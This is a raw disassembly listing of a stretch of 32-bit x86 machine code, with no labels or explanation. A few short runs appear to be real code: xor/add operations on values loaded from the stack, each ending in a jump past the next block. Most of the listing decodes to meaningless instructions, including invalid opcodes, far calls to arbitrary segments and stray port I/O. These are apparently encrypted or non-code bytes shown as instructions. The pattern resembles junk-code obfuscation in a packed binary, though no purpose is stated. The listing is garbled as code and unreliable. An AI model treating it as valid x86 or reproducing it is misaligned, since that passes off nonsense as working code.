  405b81:	lahf   
  405b82:	xor    al,0xc1
  405b84:	jg     0x405b27
  405b86:	cmp    bl,BYTE PTR [esi]
  405b88:	lods   al,BYTE PTR ds:[esi]
  405b89:	mov    eax,DWORD PTR [ebp-0x14]
  405b8c:	xor    eax,esi
  405b8e:	add    eax,edi
  405b90:	push   eax
  405b91:	mov    eax,DWORD PTR [ebp-0x10]
  405b94:	add    eax,0xaa
  405b99:	push   eax
  405b9a:	jmp    0x405d92
  405b9f:	jne    0x405bbe
  405ba1:	adc    eax,0x71b155b1
  405ba6:	fld    DWORD PTR [edi+0x3f]
  405ba9:	mov    dh,0xdb
  405bab:	call   0x60c2ccea
  405bb0:	sub    DWORD PTR [esi+0x7e],edi
  405bb3:	push   ebp
  405bb4:	jg     0x405c34
  405bb6:	jle    0x405b9c
  405bb8:	pop    ebx
  405bb9:	jnp    0x405ba4
  405bbb:	(bad)  
  405bbc:	fdivr  st(7),st
  405bbe:	shr    DWORD PTR [esi],0x58
  405bc1:	test   BYTE PTR [ebp+0x55bdc747],dh
  405bc7:	dec    ebx
  405bc8:	jecxz  0x405c48
  405bca:	call   0x73b7:0x7474fec3
  405bd1:	mov    ch,0x21
  405bd3:	in     al,dx
  405bd4:	and    al,BYTE PTR [ecx+edi*1+0x4efb3e2d]
  405bdb:	dec    ecx
  405bdc:	xlat   BYTE PTR ds:[ebx]
  405bdd:	ret    0xdcfe
  405be0:	(bad)  
  405be1:	pop    edi
  405be2:	clc    
  405be3:	and    ch,BYTE PTR [eax+0xc]
  405be6:	dec    edi
  405be7:	jnp    0x405c55
  405be9:	push   ecx
  405bea:	imul   ebp,DWORD PTR ss:[ebp+edi*8-0xdb42f14],0x70
  405bf3:	add    edi,DWORD PTR [edi+0xaab07d9]
  405bf9:	les    ebp,FWORD PTR [edx]
  405bfb:	xor    DWORD PTR [ebp+0x13],ebx
  405bfe:	mov    al,0xd7
  405c00:	shl    BYTE PTR ds:0xdd85835b,1
  405c06:	fbld   TBYTE PTR [esi-0xb]
  405c09:	ds repz dec esp
  405c0c:	ret    0x32f2
  405c0f:	and    al,dl
  405c11:	std    
  405c12:	bnd jae 0x405bc5
  405c15:	loop   0x405c13
  405c17:	cmp    bl,BYTE PTR [esi-0x624baa82]
  405c1d:	sub    al,0x70
  405c1f:	outs   dx,DWORD PTR ds:[esi]
  405c20:	jp     0x405c55
  405c22:	dec    esp
  405c23:	ret    0x792
  405c26:	inc    esi
  405c27:	fs add bl,BYTE PTR gs:[ecx+0x1b]
  405c2c:	sub    al,0x9a
  405c2e:	enter  0xee2d,0xe7
  405c32:	repnz ror BYTE PTR [edx+0x3b],cl
  405c36:	inc    ebx
  405c37:	adc    edx,0xff738980
  405c3d:	inc    ebp
  405c3e:	sbb    al,0xa3
  405c40:	call   0xb0bb:0x395b46fa
  405c47:	aaa    
  405c48:	push   esp
  405c49:	push   edi
  405c4a:	test   eax,0x5ff16a04
  405c4f:	(bad)  
  405c50:	out    dx,al
  405c51:	xchg   ecx,eax
  405c52:	xchg   esp,eax
  405c53:	mov    al,ds:0xa7a7ee77
  405c58:	mov    dh,0xfa
  405c5a:	lock adc al,0x81
  405c5d:	push   esp
  405c5e:	jns    0x405bfc
  405c60:	cmp    al,0x84
  405c62:	xlat   BYTE PTR ds:[ebx]
  405c63:	call   0xd341:0xcfeaebc6
  405c6a:	push   ebp
  405c6b:	popa   
  405c6c:	adc    ecx,esi
  405c6e:	cmp    al,0x8e
  405c70:	push   edx
  405c71:	cli    
  405c72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c73:	mov    al,BYTE PTR [ebx+ecx*2+0x42999109]
  405c7a:	inc    edx
  405c7b:	cs nop
  405c7d:	sbb    al,bl
  405c7f:	cmp    ebx,ebx
  405c81:	div    DWORD PTR [ebx-0x4a5c1fd]
  405c87:	inc    ebp
  405c88:	sbb    al,BYTE PTR [ebp+0x23]
  405c8b:	and    al,0x19
  405c8d:	dec    esp
  405c8e:	dec    esp
  405c8f:	adc    edi,DWORD PTR [esp+ecx*1]
  405c92:	hlt    
  405c93:	push   ss
  405c94:	lds    ebx,FWORD PTR [ecx+ecx*4-0x1df837b0]
  405c9b:	jecxz  0x405c56
  405c9d:	data16 std 
  405c9f:	ss pop esi
  405ca1:	lds    edx,FWORD PTR [ebp-0x9]
  405ca4:	xchg   esi,eax
  405ca5:	or     al,BYTE PTR [ebp-0x7e24a79b]
  405cab:	fcmovnb st,st(7)
  405cad:	dec    ebx
  405cae:	add    al,0xb7
  405cb0:	addr16 push es
  405cb2:	pop    DWORD PTR [ebp+0x5595d68]
  405cb8:	mov    ds:0xffd9c262,eax
  405cbd:	in     al,dx
  405cbe:	inc    DWORD PTR ds:0xc5de8b82
  405cc4:	mov    eax,0x2c8070b9
  405cc9:	lods   eax,DWORD PTR ds:[esi]
  405cca:	xchg   ecx,eax
  405ccb:	jmp    0xe54f:0xc905f466
  405cd2:	adc    DWORD PTR [ebx+0xc1a66da],eax
  405cd8:	inc    ecx
  405cd9:	dec    ebp
  405cda:	adc    al,0x91
  405cdc:	popa   
  405cdd:	xchg   esi,eax
  405cde:	add    BYTE PTR ds:0x4508ff45,cl
  405ce4:	pushf  
  405ce5:	xor    eax,0xfad2dd0b
  405cea:	mov    dl,0x54
  405cec:	jbe    0x405ce2
  405cee:	ret    0x12b9
  405cf1:	adc    eax,0x9cb3e1fa
  405cf6:	push   0x89e70fea
  405cfb:	pushf  
  405cfc:	sub    eax,0x50c0cb72
  405d01:	add    BYTE PTR [ebx],ch
  405d03:	int    0x5f
  405d05:	sub    ecx,DWORD PTR [esi+0x4]
  405d08:	mov    ch,0xd9
  405d0a:	fwait
  405d0b:	aaa    
  405d0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d0d:	sbb    eax,0x8cb6d111
  405d12:	psubsb mm6,QWORD PTR [edx-0x3527419d]
  405d19:	stos   DWORD PTR es:[edi],eax
  405d1a:	mov    ah,0xd4
  405d1c:	lds    edx,FWORD PTR [ecx]
  405d1e:	(bad)  
  405d1f:	lds    esi,FWORD PTR [edi-0x5]
  405d22:	add    bl,BYTE PTR ds:0x7ee7c80
  405d28:	dec    ebp
  405d29:	push   cs
  405d2a:	dec    eax
  405d2b:	gs dec eax
  405d2d:	mov    edi,0xca015f67
  405d32:	sbb    bx,WORD PTR [ebx+eax*8]
  405d36:	loopne 0x405cf5
  405d38:	cmp    BYTE PTR [ebx+0x41],bh
  405d3b:	hlt    
  405d3c:	test   DWORD PTR [edx-0x16],edi
  405d3f:	xchg   esp,eax
  405d40:	ss jl  0x405d57
  405d43:	xlat   BYTE PTR ds:[ebx]
  405d44:	or     DWORD PTR [esi],ebx
  405d46:	mov    ebx,0x9312582c
  405d4b:	push   0x60
  405d4d:	jae    0x405d22
  405d4f:	and    eax,0x320e101b
  405d54:	out    dx,al
  405d55:	int3   
  405d56:	and    ah,BYTE PTR [eax]
  405d58:	inc    esi
  405d59:	lock inc ecx
  405d5b:	sub    BYTE PTR [ebx+0x6c],ch
  405d5e:	ror    DWORD PTR [eax+0x70],cl
  405d61:	push   ebp
  405d62:	adc    al,0x75
  405d64:	push   ecx
  405d65:	repz add bh,BYTE PTR [ebp+0x3c]
  405d69:	fs inc ebx
  405d6b:	fwait
  405d6c:	mov    edi,0x7b9f954d
  405d71:	pop    edx
  405d72:	pop    ebx
  405d73:	jp     0x405dcb
  405d75:	pop    eax
  405d76:	imul   esp,DWORD PTR [edi-0x44],0xf819af2d
  405d7d:	adc    ebp,edx
  405d7f:	dec    ebp
  405d80:	add    esi,DWORD PTR [eax]
  405d82:	or     eax,DWORD PTR [ebx]
  405d84:	ret    0x9ad8
  405d87:	addr16 sub ebx,edi
  405d8a:	dec    esp
  405d8b:	ror    bh,0x33
  405d8e:	daa    
  405d8f:	push   esi
  405d90:	fs fwait
  405d92:	mov    eax,DWORD PTR [ebp-0x10]
  405d95:	mov    eax,DWORD PTR [eax+0x198]
  405d9b:	push   DWORD PTR [eax]
  405d9d:	call   0x40cdc5
  405da2:	mov    DWORD PTR [ebp-0x8],eax
  405da5:	cmp    DWORD PTR [ebp-0x8],0x0
  405da9:	lea    eax,[ebp+0x4]
  405dac:	jmp    0x405fa4
  405db1:	xchg   ebx,eax
  405db2:	leave  
  405db3:	ror    DWORD PTR [esi-0x2eae69af],1
  405db9:	mov    ds:0x3a9c135b,al
  405dbe:	aam    0xfd
  405dc0:	jo     0x405e09
  405dc2:	aaa    
  405dc3:	jle    0x405e43
  405dc5:	push   ebp
  405dc6:	jg     0x405e46
  405dc8:	jle    0x405d68
  405dca:	dec    ecx
  405dcb:	and    bl,BYTE PTR [edx-0x319ae643]
  405dd1:	jecxz  0x405d7c
  405dd3:	repnz lahf 
  405dd5:	(bad)
  405dd8:	sti    
  405dd9:	shr    bh,1
  405ddb:	pop    edx
  405ddc:	jmp    0x7a3:0xc3474e5b
  405de3:	aaa    
  405de4:	lahf   
  405de5:	std    
  405de6:	sbb    al,0x69
  405de8:	or     eax,0x5963599f
  405ded:	xor    DWORD PTR [ebp-0x66],edi
  405df0:	test   eax,0x7419776f
  405df5:	xchg   dx,ax
  405df7:	cmp    eax,0xe28cf90c
  405dfc:	test   DWORD PTR [edi+0x724eabbf],0xbc1a44b6
  405e06:	mov    bl,0x9d
  405e08:	call   0x8eeaf13a
  405e0d:	imul   edi,DWORD PTR [edx-0x14c88f32],0x36cf8726
  405e17:	repz ror al,1
  405e1a:	les    edi,FWORD PTR [esi]
  405e1c:	in     al,dx
  405e1d:	fdivr  QWORD PTR [ebp-0x2fb750e2]
  405e23:	adc    al,0x86
  405e25:	adc    eax,0x2698badf
  405e2a:	xor    al,0xa1
  405e2c:	and    al,0x1b
  405e2e:	xor    dh,bl
  405e30:	sub    ebp,esp
  405e32:	cmc    
  405e33:	mov    ch,0x37
  405e35:	enter  0x25a8,0xa9
  405e39:	daa    
  405e3a:	cli    
  405e3b:	aaa    
  405e3c:	pop    eax
  405e3d:	pop    esi
  405e3e:	push   ss
  405e3f:	push   es
  405e40:	imul   ebx,ebp,0xffffffef
  405e43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e44:	loop   0x405eb9
  405e46:	ds jae 0x405e33
  405e49:	pusha  
  405e4a:	inc    DWORD PTR [edx]
  405e4c:	jae    0x405dd6
  405e4e:	imul   ebp,DWORD PTR [esi-0x52],0x6d
  405e52:	pop    eax
  405e53:	mov    esp,0xe07392f
  405e58:	dec    edi
  405e59:	jne    0x405de6
  405e5b:	mov    edx,0x850bf996
  405e60:	jns    0x405ed9
  405e62:	das    
  405e63:	xchg   BYTE PTR [eax],dh
  405e65:	shl    BYTE PTR [esi+0x72],cl
  405e68:	or     bh,ah
  405e6a:	pop    edi
  405e6b:	rcl    DWORD PTR cs:[esi+0x77],0x10
  405e70:	leave  
  405e71:	fstp   st(5)
  405e73:	inc    esp
  405e74:	mov    DWORD PTR [edx+0x5],esp
  405e77:	fld    TBYTE PTR [esi+0x46]
  405e7a:	xor    bh,al
  405e7c:	das    
  405e7d:	inc    esi
  405e7e:	adc    eax,0x90400727
  405e83:	gs push ebx
  405e85:	pop    eax
  405e86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e87:	in     al,0x3e
  405e89:	mov    ah,0xe7
  405e8b:	add    ebx,DWORD PTR [eax]
  405e8d:	loope  0x405e62
  405e8f:	jmp    0x3189:0x99671e58
  405e96:	jp     0x405eae
  405e98:	mov    edi,0x14ddbefc
  405e9d:	retf   
  405e9e:	cli    
  405e9f:	jmp    0x603f533
  405ea4:	sbb    eax,0x1e186d43
  405ea9:	cmp    eax,0xb545a6c5
  405eae:	retf   0xcf9e
  405eb1:	nop
  405eb2:	stc    
  405eb3:	mov    ecx,0x7a2071dc
  405eb8:	inc    esi
  405eb9:	mov    ebp,DWORD PTR [ecx]
  405ebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ebc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ebd:	shr    eax,1
  405ebf:	cmp    al,0xf8
  405ec1:	inc    ebp
  405ec2:	mov    edi,0xbbd9024a
  405ec7:	fs stos DWORD PTR es:[edi],eax
  405ec9:	mov    ch,BYTE PTR [edx+0x6f4da366]
  405ecf:	jo     0x405f24
  405ed1:	mov    BYTE PTR [ebp+0x1b],ah
  405ed4:	dec    ebx
  405ed5:	or     eax,0xc1bdae95
  405eda:	ret    0xdad2
  405edd:	adc    bh,BYTE PTR [ebp+0x4a]
  405ee0:	xchg   DWORD PTR [eax+0x5166a3a5],ecx
  405ee6:	mov    eax,ds:0xed3e14eb
  405eeb:	jecxz  0x405ee1
  405eed:	in     eax,dx
  405eee:	xor    al,0x23
  405ef0:	stos   DWORD PTR es:[edi],eax
  405ef1:	ins    BYTE PTR es:[edi],dx
  405ef2:	ret    0x599a
  405ef5:	lods   al,BYTE PTR ds:[esi]
  405ef6:	imul   eax,eax,0xffffff93
  405ef9:	gs std 
  405efb:	adc    eax,0x1cad4e59
  405f00:	ficomp WORD PTR [edx]
  405f02:	lahf   
  405f03:	push   esp
  405f04:	inc    ebx
  405f05:	xor    BYTE PTR ds:0xe55463d8,dl
  405f0b:	inc    ebx
  405f0c:	adc    eax,0x8e53f16a
  405f11:	sub    DWORD PTR [eax-0x7f],edi
  405f14:	push   0x31
  405f16:	sub    DWORD PTR ds:0xa9f6f9f3,edi
  405f1c:	push   0xfb89cbbb
  405f21:	and    al,0x3b
  405f23:	stc    
  405f24:	imul   eax,DWORD PTR [edx-0x63],0x108d8a26
  405f2b:	mov    ds:0x8730cf8e,al
  405f30:	into   
  405f31:	sti    
  405f32:	in     eax,dx
  405f33:	inc    edx
  405f34:	(bad)  
  405f35:	imul   ebp,DWORD PTR [ebp+ebx*8+0x605aa73f],0xffffffb5
  405f3d:	shl    DWORD PTR [eax],1
  405f3f:	sahf   
  405f40:	(bad)  
  405f42:	call   0x8e7629e7
  405f47:	and    BYTE PTR ds:0x5c58842e,cl
  405f4d:	add    eax,0x3da677a2
  405f52:	pop    esi
  405f53:	pop    ecx
  405f54:	xchg   ecx,eax
  405f55:	mov    ebp,0xebfe982b
  405f5a:	xchg   esp,eax
  405f5b:	ss cmc 
  405f5d:	dec    esi
  405f5e:	mov    al,ds:0xc423f3a9
  405f63:	cld    
  405f64:	add    al,0x23
  405f66:	leave  
  405f67:	xchg   ebx,eax
  405f68:	(bad)  
  405f69:	fbld   TBYTE PTR [ebp+0x2defb778]
  405f6f:	(bad)  
  405f70:	fild   WORD PTR [esi+0x660fd9f4]
  405f76:	adc    esp,edx
  405f78:	mov    ss,eax
  405f7a:	fdivr  st,st(7)
  405f7c:	xchg   esp,eax
  405f7d:	push   ds
  405f7e:	fsub   QWORD PTR [edx-0x2e]
  405f81:	adc    bh,BYTE PTR [esi]
  405f83:	adc    dl,ah
  405f85:	add    al,0x71
  405f87:	xchg   BYTE PTR [eax+0x5e27257f],bl
  405f8d:	and    eax,0x653b8e2
  405f92:	out    0x1c,al
  405f94:	call   0xb66686e9
  405f99:	pop    eax
  405f9a:	(bad)  
  405f9b:	stc    
  405f9c:	cli    
  405f9d:	sub    eax,0xfa5830a3
  405fa2:	mov    dl,0xc2
  405fa4:	mov    DWORD PTR [ebp-0x20],eax
  405fa7:	je     0x406a43
  405fad:	jmp    0x4061a5
  405fb2:	jmp    0x405fa8
  405fb4:	pushf  
  405fb5:	dec    esi
  405fb6:	mov    eax,ds:0x9371e956
  405fbb:	inc    ebx
  405fbc:	and    dl,BYTE PTR [ecx-0x53]
  405fbf:	call   0x35da9cbf
  405fc4:	jle    0x406044
  405fc6:	push   ebp
  405fc7:	jg     0x406047
  405fc9:	jle    0x405fd0
  405fcb:	call   0x2368e416
  405fd0:	aam    0xd9
  405fd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fd3:	mov    dh,0x42
  405fd5:	rcl    DWORD PTR [ebp-0x44d95344],1
  405fdb:	or     eax,0xe3bb93cd
  405fe0:	mov    ah,0xfb
  405fe2:	or     al,0xf
  405fe4:	ficom  DWORD PTR [esi+0x50]
  405fe7:	pop    ebp
  405fe8:	inc    esp
  405fe9:	not    DWORD PTR [eax+esi*1-0x7f]
  405fed:	sbb    ecx,DWORD PTR [edi+0x68]
  405ff0:	loope  0x405fb5
  405ff2:	push   es
  405ff3:	push   0xe386f6b9
  405ff8:	aas    
  405ff9:	in     eax,dx
  405ffa:	cmp    al,0xc4
  405ffc:	mov    esp,0xc27a63c0
  406001:	pushf  
  406002:	ins    DWORD PTR es:[edi],dx
  406003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406004:	hlt    
  406005:	fisttp QWORD PTR [eax+0x2c]
  406008:	pop    esp
  406009:	out    0xae,al
  40600b:	xchg   esp,eax
  40600c:	push   es
  40600d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40600e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40600f:	pop    ss
  406010:	jge    0x405fb6
  406012:	jb     0x405fa3
  406014:	cmp    eax,0xec9704ca
  406019:	sub    eax,0x59a4cdca
  40601e:	adc    eax,0xc50f295e
  406023:	xchg   edi,eax
  406024:	fs inc esi
  406026:	dec    edx
  406027:	pop    ds
  406028:	push   ss
  406029:	mov    ebx,DWORD PTR [ebx-0x4ea875b5]
  40602f:	leave  
  406030:	cmc    
  406031:	mov    ebp,0xe8a6ece
  406036:	adc    al,0xfd
  406038:	xchg   BYTE PTR [eax],dh
  40603a:	(bad)  
  40603b:	imul   ebp,DWORD PTR [esp+ebp*1+0x7fd9afb2],0xe
  406043:	test   BYTE PTR [eax+edx*2+0x62],ch
  406047:	jae    0x405fe2
  406049:	mov    ch,0xa3
  40604b:	mov    DWORD PTR [ecx*2+0x8c11da2],esi
  406052:	adc    dl,dh
  406054:	scas   eax,DWORD PTR es:[edi]
  406055:	iretw  
  406057:	fs mov ecx,0xcb5ea396
  40605d:	xchg   edi,eax
  40605e:	and    al,0xf5
  406060:	or     ah,BYTE PTR [esi-0x21]
  406063:	int3   
  406064:	(bad)  
  406065:	mov    ch,0x51
  406067:	call   0xafe4:0xda68240e
  40606e:	loope  0x405ffb
  406070:	mov    ds:0x9453dc18,eax
  406075:	imul   DWORD PTR [ecx]
  406077:	aaa    
  406078:	dec    ecx
  406079:	call   0x7d7d:0x82965eae
  406080:	fcomp  st(2)
  406082:	out    0xe5,al
  406084:	outs   dx,DWORD PTR ds:[esi]
  406085:	sbb    eax,0xa87af1d3
  40608a:	or     ebx,ebp
  40608c:	or     ecx,ecx
  40608e:	(bad)  [ecx+0x3b]
  406091:	xchg   ebx,eax
  406092:	rcl    BYTE PTR [ebp+0x227e6675],0x55
  406099:	(bad)  
  40609a:	or     cl,BYTE PTR [edi]
  40609c:	in     al,0x6
  40609e:	scas   al,BYTE PTR es:[edi]
  40609f:	repz sti 
  4060a1:	mov    ds:0x27f5c923,al
  4060a6:	arpl   WORD PTR [eax+edx*1+0x7c679756],bp
  4060ad:	sbb    eax,0x136488e3
  4060b2:	js     0x4060a0
  4060b4:	fs cs inc ebx
  4060b7:	jns    0x406053
  4060b9:	cmp    dl,BYTE PTR [ebx+0x629823e6]
  4060bf:	out    0x3a,al
  4060c1:	cld    
  4060c2:	cs inc ebx
  4060c4:	mov    ecx,0xe7d2e69c
  4060c9:	xor    eax,0x897e0630
  4060ce:	(bad)  
  4060cf:	xchg   ebx,eax
  4060d0:	add    al,BYTE PTR [edx-0x794e965e]
  4060d6:	mov    BYTE PTR [edx-0x12],ah
  4060d9:	inc    ecx
  4060da:	inc    ebp
  4060db:	add    edi,DWORD PTR [ebx]
  4060dd:	sub    bh,BYTE PTR [esi-0x42]
  4060e0:	pop    ss
  4060e1:	xor    al,0x1
  4060e3:	push   ecx
  4060e4:	mov    ecx,0x92e4b328
  4060e9:	add    ebx,DWORD PTR [ebx+ebx*4+0x7b]
  4060ed:	mov    al,0xb5
  4060ef:	or     eax,0xdb79251
  4060f4:	mov    dh,0xf6
  4060f6:	fidiv  DWORD PTR [ebx]
  4060f8:	inc    ecx
  4060f9:	mov    bh,0x19
  4060fb:	mov    esp,0xcac78bdd
  406100:	ret    
  406101:	(bad)  
  406102:	leave  
  406103:	ins    BYTE PTR es:[edi],dx
  406104:	cmc    
  406105:	dec    esi
  406106:	xor    DWORD PTR [ebp-0x66],ebx
  406109:	inc    ebp
  40610a:	in     eax,0x1e
  40610c:	hlt    
  40610d:	add    dh,dl
  40610f:	mov    ah,0x6a
  406111:	pushf  
  406112:	clc    
  406113:	sar    BYTE PTR [edx-0x6fd4e71b],0x2a
  40611a:	xchg   BYTE PTR [eax],ch
  40611c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40611d:	dec    ebp
  40611e:	jno    0x4060d9
  406120:	call   0xe3a4:0xccdb6aa8
  406127:	in     eax,0x4e
  406129:	mov    bh,0x5a
  40612b:	lods   al,BYTE PTR ds:[esi]
  40612c:	out    dx,eax
  40612d:	push   0xfffffff9
  40612f:	adc    BYTE PTR [ecx],0x12
  406132:	out    0xfb,al
  406134:	sbb    eax,DWORD PTR [eax]
  406136:	jge    0x406186
  406138:	ror    DWORD PTR [esi+eax*8-0x45],0xf6
  40613d:	sar    ebp,1
  40613f:	and    BYTE PTR [esi+0x8],0xdb
  406143:	mov    BYTE PTR [eax],ah
  406145:	out    0x4a,eax
  406147:	in     al,dx
  406148:	loopne 0x406168
  40614a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40614b:	jb     0x406135
  40614d:	adc    ecx,DWORD PTR [ebx]
  40614f:	and    edx,DWORD PTR [eax]
  406151:	jne    0x406117
  406153:	sbb    BYTE PTR [edi-0x5c],0xc3
  406157:	rcl    esp,0xac
  40615a:	push   edx
  40615b:	mov    eax,DWORD PTR [eax+0x48]
  40615e:	sub    DWORD PTR [edi+0x4f7dbd14],eax
  406164:	xor    BYTE PTR [ecx+0xe70401e],ch
  40616a:	adc    BYTE PTR [ecx],dl
  40616c:	test   ch,dh
  40616e:	cmp    dl,BYTE PTR [eax]
  406170:	sti    
  406171:	jo     0x4061de
  406173:	shl    DWORD PTR [esi+0x4013b145],cl
  406179:	sub    eax,0x326aeded
  40617e:	xchg   ecx,eax
  40617f:	xor    DWORD PTR [ecx-0x29],esi
  406182:	xlat   BYTE PTR ds:[ebx]
  406183:	lock push ebp
  406185:	inc    esi
  406186:	es sbb dl,dh
  406189:	mov    eax,0x61df0830
  40618e:	xor    BYTE PTR [eax+0x40],cl
  406191:	xchg   edx,eax
  406192:	pop    ebx
  406193:	push   ss
  406194:	sub    al,0x9d
  406196:	add    eax,0xa3e2633e
  40619b:	mov    edi,0xbe44e4ed
  4061a0:	repz loopne 0x4061b2
  4061a3:	enter  0x8dbb,0x45
  4061a7:	call   0xd485ecfc
  4061ac:	xor    eax,esi
  4061ae:	add    eax,edi
  4061b0:	push   eax
  4061b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4061b4:	xor    eax,esi
  4061b6:	add    eax,edi
  4061b8:	push   eax
  4061b9:	push   DWORD PTR [ebp-0x8]
  4061bc:	lea    eax,[ebp-0x78]
  4061bf:	push   eax
  4061c0:	jmp    0x4063b8
  4061c5:	cmp    eax,0xb41aac57
  4061ca:	loope  0x406215
  4061cc:	jno    0x406181
  4061ce:	dec    edi
  4061cf:	add    dl,cl
  4061d1:	lahf   
  4061d2:	sbb    BYTE PTR [eax+0x4e],bl
  4061d5:	icebp  
  4061d6:	xor    edi,DWORD PTR [esi+0x7e]
  4061d9:	push   ebp
  4061da:	jg     0x40625a
  4061dc:	jle    0x4061a5
  4061de:	and    esi,DWORD PTR [ebx-0x59]
  4061e1:	mov    eax,ds:0x46079af4
  4061e6:	mov    ah,0x6b
  4061e8:	dec    ebp
  4061e9:	push   ss
  4061ea:	imul   ebx,DWORD PTR [ecx+0x60],0xffffffc5
  4061ee:	cmp    DWORD PTR [ebx],eax
  4061f0:	ror    DWORD PTR [edx+eax*4],0x3a
  4061f4:	aaa    
  4061f5:	pop    edx
  4061f6:	outs   dx,DWORD PTR ds:[esi]
  4061f7:	push   eax
  4061f8:	sar    BYTE PTR [ecx],0xab
  4061fb:	call   FWORD PTR [ecx+ebx*4]
  4061fe:	test   BYTE PTR [edi+0x67],0x73
  406202:	mov    bh,BYTE PTR [edi]
  406204:	sbb    al,bh
  406206:	adc    ecx,0x64083473
  40620c:	and    eax,0x6bd28f4a
  406211:	mov    dh,0xd4
  406213:	fadd   DWORD PTR [edi]
  406215:	inc    ecx
  406216:	push   eax
  406217:	cld    
  406218:	outs   dx,BYTE PTR ds:[esi]
  406219:	mov    dh,0xd
  40621b:	inc    edx
  40621c:	push   esp
  40621d:	in     eax,dx
  40621e:	pop    ecx
  40621f:	pop    ecx
  406220:	in     al,dx
  406221:	jb     0x4061fa
  406223:	(bad)  
  406224:	in     al,0xad
  406226:	rcl    DWORD PTR [edi-0x3d],0x66
  40622a:	aas    
  40622b:	pop    ds
  40622c:	mov    eax,ds:0x9f28ea9a
  406231:	jbe    0x406236
  406233:	out    0x63,eax
  406235:	hlt    
  406236:	cmc    
  406237:	stos   BYTE PTR es:[edi],al
  406238:	pop    ebp
  406239:	add    al,0x89
  40623b:	outs   dx,DWORD PTR ds:[esi]
  40623c:	and    DWORD PTR [edi],edx
  40623e:	sbb    esp,edi
  406240:	mov    dh,0x36
  406242:	jnp    0x40628d
  406244:	mov    DWORD PTR [esi-0x5],esp
  406247:	std    
  406248:	stc    
  406249:	mov    edx,0x636b7279
  40624e:	inc    ebp
  40624f:	ss dec esi
  406251:	loope  0x4062bc
  406253:	dec    edi
  406254:	add    bh,BYTE PTR [ecx]
  406256:	jecxz  0x406231
  406258:	jle    0x406285
  40625a:	cs mov edx,0x9d7869e0
  406260:	aas    
  406261:	xor    al,0x39
  406263:	or     al,0xab
  406265:	mov    bl,0xb4
  406267:	xchg   bl,ah
  406269:	cmp    DWORD PTR [esi],esp
  40626b:	push   ss
  40626c:	pusha  
  40626d:	imul   esi,DWORD PTR [eax],0x7a4b246d
  406273:	es jne 0x40620b
  406276:	cwde   
  406277:	fsub   QWORD PTR [ebp-0x6fd3f36d]
  40627d:	outs   dx,DWORD PTR ds:[esi]
  40627e:	out    dx,al
  40627f:	cmp    ebx,eax
  406281:	fistp  DWORD PTR [edx+0xa]
  406284:	sbb    DWORD PTR [ebx],esp
  406286:	xor    esp,DWORD PTR [ebx]
  406288:	bound  ecx,QWORD PTR [esi+0x778f28d3]
  40628e:	pop    esp
  40628f:	sbb    al,0x39
  406291:	or     BYTE PTR [bp+0x4f],bh
  406295:	pop    esp
  406296:	inc    ebp
  406297:	repz mov ah,BYTE PTR [esi+0x4e]
  40629b:	push   ds
  40629c:	ret    0xfca2
  40629f:	imul   esp,edx,0xad779475
  4062a5:	sub    al,0x4b
  4062a7:	cwde   
  4062a8:	ret    
  4062a9:	inc    esi
  4062aa:	into   
  4062ab:	retf   
  4062ac:	xchg   edi,eax
  4062ad:	(bad)  
  4062ae:	scas   al,BYTE PTR es:[edi]
  4062af:	dec    si
  4062b1:	icebp  
  4062b2:	sbb    al,0xef
  4062b4:	mov    bh,0xed
  4062b6:	sbb    al,0x6c
  4062b8:	pop    ebx
  4062b9:	not    BYTE PTR ds:0x5cee9f85
  4062bf:	sbb    edi,edx
  4062c1:	icebp  
  4062c2:	test   al,0xce
  4062c4:	mov    DWORD PTR [edi+ebx*1-0x75],edx
  4062c8:	pop    ecx
  4062c9:	inc    esp
  4062ca:	xor    dh,BYTE PTR [edx+0x14]
  4062cd:	xchg   edi,eax
  4062ce:	sub    DWORD PTR [ebp+ebp*4-0x7c],ebp
  4062d2:	add    eax,0xb53df854
  4062d7:	jnp    0x40633a
  4062d9:	mov    ebp,0x85f1266b
  4062de:	stos   BYTE PTR es:[edi],al
  4062df:	rol    DWORD PTR [esi-0x5e17bc3c],cl
  4062e5:	mov    eax,0xc3f4a6f7
  4062ea:	repz adc al,0xbb
  4062ed:	dec    ebx
  4062ee:	bound  esi,QWORD PTR [ecx+0x55]
  4062f1:	popa   
  4062f2:	loopne 0x4062ca
  4062f4:	out    0xf2,eax
  4062f6:	pop    ds
  4062f7:	shl    DWORD PTR [edx+0x7948bd66],1
  4062fd:	mov    cl,BYTE PTR [edi]
  4062ff:	mov    BYTE PTR [ecx],dh
  406301:	inc    esi
  406302:	das    
  406303:	scas   al,BYTE PTR es:[edi]
  406304:	mov    ecx,0xd8ccb319
  406309:	mov    eax,ss
  40630b:	pop    ds
  40630c:	call   0x383e7037
  406311:	mov    ch,0xfa
  406313:	or     cl,dl
  406315:	dec    ecx
  406316:	ja     0x4062ae
  406318:	les    esp,FWORD PTR [eax]
  40631a:	pop    edi
  40631b:	in     al,0x73
  40631d:	mov    BYTE PTR [ecx-0x5b425aac],bl
  406323:	ror    DWORD PTR [ebx+ebx*4],0x38
  406327:	stc    
  406328:	add    dh,BYTE PTR [eax]
  40632a:	xchg   edx,eax
  40632b:	lods   eax,DWORD PTR ds:[esi]
  40632c:	pop    ebp
  40632d:	test   DWORD PTR [esi+0x2c92c625],0xa2b5f1ed
  406337:	mov    ah,0xe8
  406339:	dec    BYTE PTR [edx]
  40633b:	scas   al,BYTE PTR es:[edi]
  40633c:	push   DWORD PTR [ecx+0x3d3da80b]
  406342:	mov    es,WORD PTR [eax+0x4b]
  406345:	lods   al,BYTE PTR ds:[esi]
  406346:	or     cl,dh
  406348:	stos   DWORD PTR es:[edi],eax
  406349:	jnp    0x406374
  40634b:	rcl    DWORD PTR [esi],0xcf
  40634e:	aam    0x91
  406350:	jno    0x4063c9
  406352:	or     dl,BYTE PTR [ebp*8+0x76d63fa]
